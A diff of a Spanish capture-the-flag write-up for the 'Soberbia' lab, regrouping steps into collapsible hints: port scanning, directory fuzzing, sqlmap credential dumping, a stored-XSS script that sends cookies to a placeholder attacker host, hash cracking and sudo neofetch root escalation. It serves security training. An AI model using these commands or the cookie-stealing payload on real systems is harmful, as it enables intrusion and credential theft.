@@ -1,6 +1,5 @@
 = Soberbia
 :author: Manuel L. Quero
-:revdate: 2025-05-02
 :toc: left
 :doctype: book
 
@@ -35,18 +34,19 @@ $ sudo bash auto_deploy.sh soberbia.tar
 
 === Reconocimiento
 
-==== Nmap
+==== Fase 1
 
-Empezaremos conociendo los puertos que tiene abiertos el servidor. Para ello haremos uso primeramente de https://nmap.org/man/es/index.html[nmap].
+Empezaremos conociendo los puertos que tiene abiertos el servidor.
 
-.Nmap Recon
+.Pista 1
 [%collapsible]
 ====
+Para ello haremos uso primeramente de https://nmap.org/man/es/index.html[nmap].
+
 [source,bash]
 ----
 sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn (IP) -oG allPorts
 ----
-====
 
 * *sudo* -> Necesario porque -sS (SYN scan) requiere privilegios.
 * *nmap* -> Llama a la herramienta Nmap.
@@ -60,64 +60,77 @@ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn (IP) -oG allPorts
 * *(IP)* -> La dirección IP del objetivo.
 * *-oG allPorts* -> Guarda los resultados en formato grepable (fácil de extraer con grep o awk) en el archivo allPorts.
 
+[.text-center]
 image::assets/recon/nmap/nmap.png[nmap]
 
-Como podemos ver están abiertos los puertos 80 y 22, podemos ver sus versiones con el siguiente comando:
+Como podemos ver están abiertos los puertos 80 y 22
+====
 
-.Nmap Versiones
+.Pista 2
 [%collapsible]
 ====
+Podemos ver sus versiones con el siguiente comando:
+
 [source,bash]
 ----
 nmap -p (PORTS) -sC -sV (IP) 
 ----
-====
 
 * *-p (PORTS)* -> Indica los puertos que quieres escanear. Puedes poner un solo puerto (80), varios (22,80,443) o un rango (1-1000).
 * *-sC* -> Usa los scripts por defecto de Nmap (los más comunes y seguros). Es similar a usar --script=default. Esto ayuda a detectar servicios, banners, configuraciones inseguras, etc.
 * *-sV* -> Hace una detección de versión: intenta identificar el software y su versión en cada puerto abierto (por ejemplo, Apache 2.4.57).
 * *(IP)* -> La dirección IP del objetivo.
 
+[.text-center]
 image::assets/recon/nmap/nmapVer.png[Versiones nmap]
 
-Una vez identificadas las versiones de los servicios, podemos comprobar si están desactualizadas y si presentan vulnerabilidades conocidas (CVEs) que podamos explotar. Generalmente, los exploits se encuentran en repositorios como GitHub o en bases de datos especializadas como Exploit-DB. Para facilitar esta búsqueda, podemos utilizar herramientas como *https://www.exploit-db.com/searchsploit[searchsploit]*, que permite consultar Exploit-DB desde la terminal y verificar si existen exploits públicos para una versión específica.
+Una vez identificadas las versiones de los servicios, podemos comprobar si están desactualizadas y si presentan vulnerabilidades conocidas (CVEs) que podamos explotar.
+====
 
+.Sugerencia
+[%collapsible]
+====
+Generalmente, los exploits se encuentran en repositorios como GitHub o en bases de datos especializadas como Exploit-DB. Para facilitar esta búsqueda, podemos utilizar herramientas como *https://www.exploit-db.com/searchsploit[searchsploit]*, que permite consultar Exploit-DB desde la terminal y verificar si existen exploits públicos para una versión específica.
+
+[.text-center]
 image::assets/recon/nmap/searchsploit.png[searchsploit]
 
 Podemos observar que no se ha encontrado ningún exploit relevante en Exploit-DB. Es importante ser precisos con los términos de búsqueda, ya que searchsploit devuelve todos los resultados relacionados, aunque no estén directamente vinculados con nuestros servicios. Por este motivo puede aparecer algún resultado, pero no necesariamente se aplica a nuestro caso.
+====
 
-==== Fuzzing
+==== Fase 2
 
 Cómo ya hemos podido conocer, se trata de una página web sin certificado y con una conexión ssh, por lo que vamos a empezar analizando la página.
 
+[.text-center]
 image::assets/recon/fuzz/pagina.png[pagina login]
 
-Aparentemente se ve una página que no tiene nada, pero es muy posible que posea directorios y subdirectorios con archivos. Para conocer la estructura vamos hacer lo que se denomina como fuzzing de contenido, es muy útil para identificar rutas sensibles como /admin, /backup, /config.php, etc. En nuestro caso usaremos https://www.kali.org/tools/feroxbuster/[feroxbuster] y https://www.kali.org/tools/gobuster/[gobuster], y compararemos.
-
-.Feroxbuster
+.Pista 3
 [%collapsible]
 ====
+Aparentemente se ve una página que no tiene nada, pero es muy posible que posea directorios y subdirectorios con archivos. Para conocer la estructura vamos hacer lo que se denomina como fuzzing de contenido, es muy útil para identificar rutas sensibles como /admin, /backup, /config.php, etc. En nuestro caso usaremos https://www.kali.org/tools/feroxbuster/[feroxbuster] y https://www.kali.org/tools/gobuster/[gobuster], y compararemos.
+
 [source,bash]
 ----
 feroxbuster -u http://(IP) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --depth 0 --timeout 5
 ----
-====
 
 * *-u http://(IP)* -> Define la URL objetivo. Puedes sustituir (IP) por una dirección IP o dominio.
 * *-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt* -> Especifica el diccionario que se usará para generar las rutas a probar (en este caso, uno mediano del paquete de DirBuster).
 * *--depth 0* -> Recursividad infinita.
 * *--timeout 5* -> Define un tiempo de espera de 5 segundos por solicitud antes de que feroxbuster la descarte por falta de respuesta.
 
+[.text-center]
 image::assets/recon/fuzz/feroxbuster.png[feroxbuster]
+====
 
-.Gobuster
+.Pista 4
 [%collapsible]
 ====
 [source,bash]
 ----
 gobuster dir -u (IP) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
 ----
-====
 
 * *dir* -> Le especificamos que queremos buscar directorios
 * *-u (IP)* -> Define la URL objetivo. Puedes sustituir (IP) por una dirección IP o dominio.
@@ -125,43 +138,57 @@ gobuster dir -u (IP) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium
 
 Gobuster es bastante sencillo de usar, pero un defecto que tiene es que no permite recursividad, teniendo que usar scripts para que haga dicha recursividad. Sinceramente veo feroxuster como una mejora de este.
 
+[.text-center]
 image::assets/recon/fuzz/gobuster.png[gobuster]
+====
 
-==== Analisis Web
+==== Fase 3
 
+.Pista 5
+[%collapsible]
+====
 Bueno, una vez conociendo la estructura, podemos apreciar que hay un directorio en /dev, que se llama pruebas, o un alias de esta ruta que es /devzone. Esto nos sugiere que los desarrolladores podrían estar utilizando esta ruta para realizar pruebas antes de lanzar la versión final del sitio web. Es común que estas zonas contengan código en desarrollo o funcionalidades no protegidas, lo que podría representar una posible vía de explotación.
 
+[.text-center]
 image::assets/recon/web/pruebas.png[directorio pruebas]
+====
 
+.Pista 6
+[%collapsible]
+====
 Dentro de login.php podemos analizar las tecnologías con *wappalyzer* o con *whatweb* y ver que tecnologías usa.
 
+[.text-center]
 image::assets/recon/web/wappalyzer.png[wappalyzer]
+====
 
-.Whatweb
+.Pista 7
 [%collapsible]
 ====
 [source,bash]
 ----
 whatweb -a 3 -v http://172.17.0.2/1/2/4/23/dev/pruebas/login.php
 ----
-====
 
+[.text-center]
 image::assets/recon/web/whatweb.png[whatweb]
+====
 
 === Ataque
 
-==== SQLI
+==== Fase 4
 
-Conociendo un poco más a lo que nos enfrentamos, al ser un login podemos probar con sql, pero esta vez no lo vamos a hacer manual, obviamente hay formas más eficientes cómo *sqlmap*, donde comenzaremos por un reconocimiento sabiendo si es vulnerable a SQLi.
+Conociendo un poco más a lo que nos enfrentamos, al ser un login podemos probar con ciertos vectores.
 
-.Sqlmap Recon
+.Pista 8
 [%collapsible]
 ====
+Efectivamente con SQLi, pero esta vez no lo vamos a hacer manual, obviamente hay formas más eficientes cómo *sqlmap*, donde comenzaremos por un reconocimiento sabiendo si es vulnerable a SQLi.
+
 [source,bash]
 ----
 sqlmap -u "http://172.17.0.2/1/2/4/23/dev/pruebas/login.php" --data "usuario=admin&password=admin" --batch --risk=3 --level=5 --technique=BEUSTQ
 ----
-====
 
 * *-u "http://172.17.0.2/1/2/4/23/dev/pruebas/login.php"* -> Especifica la URL del objetivo, que es un formulario de login.
 * *--data "usuario=admin&password=admin"* -> Indica que se trata de una petición POST, con los parámetros usuario y password. sqlmap inyectará en estos campos. Estos los podemos encontrar si hacemos F12 en la página y observando los atributos *name* o *id* de los inputs correspondientes.
@@ -176,99 +203,146 @@ sqlmap -u "http://172.17.0.2/1/2/4/23/dev/pruebas/login.php" --data "usuario=adm
 ** T: Time-based blind
 ** Q: Inline queries
 
+[.text-center]
 image::assets/atacar/sqli/sqlmap.png[sqlmap recon]
 
 Cómo podemos ver el parametro usuario es vulnerable, además más abajo se especifica la versión de Mariadb. Ahora vamos a atacar y obtener las credenciales.
+====
 
-.Sqlmap Ataque
+.Pista 9
 [%collapsible]
 ====
 [source,bash]
 ----
 sqlmap -u "http://172.17.0.2/1/2/4/23/dev/pruebas/login.php" --data "usuario=admin&password=admin" --dump --batch
 ----
-====
 
 * *-u "http://172.17.0.2/1/2/4/23/dev/pruebas/login.php"* -> URL objetivo. Aquí es la página login.php, que probablemente procese un formulario de login.
 * *--data "usuario=admin&password=admin"* -> Indica que se trata de una petición POST, con los datos que se envían (usuario=admin&password=admin). Estos son los campos donde sqlmap probará la inyección.
 * *--dump* -> Si se encuentra una inyección válida, extraerá y mostrará automáticamente el contenido de las tablas de la base de datos.
 * *--batch* -> Ejecuta en modo automático, sin pedir confirmación para cada acción (muy útil en entornos automatizados o pruebas rápidas).
 
+[.text-center]
 image::assets/atacar/sqli/sqliattack.png[ataque sqli]
 
 Como podemos ver, hemos obtenido las credenciales de los usuarios admin y test, por lo que podremos pasar el login.
+====
 
-==== Cookies
+==== Fase 5
 
-Una vez en comentarios, podemos probar cómo funciona el sistema, enviamos un mensaje y nos lo devuelve. Esto nos puede recordar al XSS que hicimos, asi que podemos obtener las cookies por *netcat* o mirar en Storage al F12.
+Una vez en comentarios, podemos probar cómo funciona el sistema, enviamos un mensaje y nos lo devuelve. Esto nos puede recordar a primeros vectores que aprendimos.
 
+.Pista 10
+[%collapsible]
+====
+Podemos hacer un ataque XSS almacenado, asi que podemos obtener las cookies por *netcat* o mirar en Storage al F12.
+
+[.text-center]
 image::assets/atacar/xss/comentarios.png[página comentarios]
+====
 
-Mediante el comando *nc* nos podemos conectar a los puertos TCP/UDP de un host. De este modo podemos conectarnos a otros servidores usando diferentes protocolos de red. Además, también es posible crear servidores que se mantengan a la escucha de peticiones entrantes. Los puertos se abrirán por defecto mediante el protocolo TCP, aunque también se acepta el protocolo UDP. En nuestro caso, abrimos un puerto poco frecuenta para recibir los datos, la primera vez que hicimos XSS creamos nuestro propio netcat.
-
-.NetCat
+.Pista 11
 [%collapsible]
 ====
 [source,bash]
+Mediante el comando *nc* nos podemos conectar a los puertos TCP/UDP de un host. De este modo podemos conectarnos a otros servidores usando diferentes protocolos de red. Además, también es posible crear servidores que se mantengan a la escucha de peticiones entrantes. Los puertos se abrirán por defecto mediante el protocolo TCP, aunque también se acepta el protocolo UDP. En nuestro caso, abrimos un puerto poco frecuenta para recibir los datos, la primera vez que hicimos XSS creamos nuestro propio netcat.
+
 ----
 nc -lvpn 4444
 ----
+
+[.text-center]
+image::assets/atacar/xss/netcat1.png[comando netcat]
 ====
 
-image::assets/atacar/xss/netcat1.png[comando netcat]
-
-Después, dentro del comentario meteremos el siguiente script en javascript, que nos pasará las cookies del usuario actual.
-
-.XSS página
+.Pista 12
 [%collapsible]
 ====
+Después, dentro del comentario meteremos el siguiente script en javascript, que nos pasará las cookies del usuario actual.
+
 [source,javascript]
 ----
 <script>fetch('http://(IP atacante):4444?cookie=' + encodeURIComponent(document.cookie));</script>
 ----
-====
 
+[.text-center]
 image::assets/atacar/xss/xss.png[xss script]
 
 Una vez enviado dicho script veremos una cadena muy larga en GET, ese es el contenido de la cookie:
 
+[.text-center]
 image::assets/atacar/xss/netcat2.png[envio de cookies a netcat]
+====
 
+.Pista 13
+[%collapsible]
+====
 Copiamos esta cadena y la decodificamos con *cyberchef*, una herramienta web muy util para estos casos. Usamos URL decode, para ver el contenido:
 
+[.text-center]
 image::assets/atacar/xss/cyberchef.png[cyberchef]
+====
 
-Podemos ver que se almacenan las credenciales de ssh, han puesto el usuario y la contraseña hasheada separada por dos puntos. Para crackear hash podemos usar Crackstation:
+.Pista 14
+[%collapsible]
+====
+Podemos ver que se almacenan las credenciales de ssh, han puesto el usuario y la contraseña hasheada separada por dos puntos. Para crackear hash podemos usar *Crackstation*:
 
 * *Usuario:*
 
+[.text-center]
 image::assets/atacar/xss/CrackUser.png[nombre usuario]
 
 * *Contraseña:*
 
+[.text-center]
 image::assets/atacar/xss/CrackPasswd.png[contraseña]
 
-Una vez hecho esto ya tendríamos las credenciales del ssh. Pero también hay otra forma más sencilla de obtener las cookies, simplemente quería mostrar otra forma para hacer XSS y usar netcat. Le damos a F12 en la página y nos vamos a Storage, ahí podremos obtener los hashes que hemos crackeado antes.
+Una vez hecho esto ya tendríamos las credenciales del ssh. 
+====
 
+.Sugerencia
+[%collapsible]
+====
+También hay otra forma más sencilla de obtener las cookies, simplemente quería mostrar otra forma para hacer XSS y usar netcat. Le damos a F12 en la página y nos vamos a Storage, ahí podremos obtener los hashes que hemos crackeado antes.
+
+[.text-center]
 image::assets/atacar/xss/F12.png[inspeccionar]
+====
 
-==== SSH y escalada de privilegios
+==== Fase 6
 
 Con las credeciales ssh, nos conectamos al servidor:
 
+[.text-center]
 image::assets/atacar/escalada/ssh.png[conexión con el servidor]
 
+.Pista 15
+[%collapsible]
+====
 Ahora veremos si tenemos algún privilegio:
 
+[.text-center]
 image::assets/atacar/escalada/sudo-l.png[comando sudo -l]
+====
 
+.Pista 16
+[%collapsible]
+====
 Podemos ver que tenemos permisos de administración en neofetch. Por lo que buscamos en https://gtfobins.github.io/gtfobins/neofetch/[GTFOBins] si podemos escalar a través de él.
 
+[.text-center]
 image::assets/atacar/escalada/gtfobins.png[gtfobins]
+====
 
+.Pista 17
+[%collapsible]
+====
 Podemos ver que, para escalar privilegios, debemos crear un archivo temporal con el contenido exec /bin/sh y pasarlo como configuración a neofetch, ejecutado con sudo. Dicho esto, copiamos y pegamos lo que nos indica y obtenemos privilegios de root.
 
+[.text-center]
 image::assets/atacar/escalada/root.png[somos root]
+====
 
 <<<
 
